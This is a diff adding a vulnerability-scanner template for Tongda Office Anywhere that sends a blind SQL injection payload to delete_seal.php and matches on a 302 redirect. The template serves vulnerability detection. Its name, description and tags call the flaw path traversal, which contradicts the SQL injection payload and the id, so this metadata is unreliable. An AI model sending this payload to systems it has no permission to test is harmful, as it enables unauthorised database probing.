@@ -1,0 +1,29 @@
+
+id: tongda-oav11-sqli
+
+info:
+  name: Office Anywhere TongDa - Path Traversal
+  author: pikpikcu
+  severity: critical
+  description: 容易受到路径遍历漏洞的影响，可以利用这些漏洞来执行远程代码执行。
+  tags: tongda,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
+   
+        
+
+    matchers-condition: and
+    matchers:
+      
+      - type: word
+        part: header
+        words:
+          - "manage.php?start"
+        condition: and
+      
+      - type: status
+        status:
+          - 302
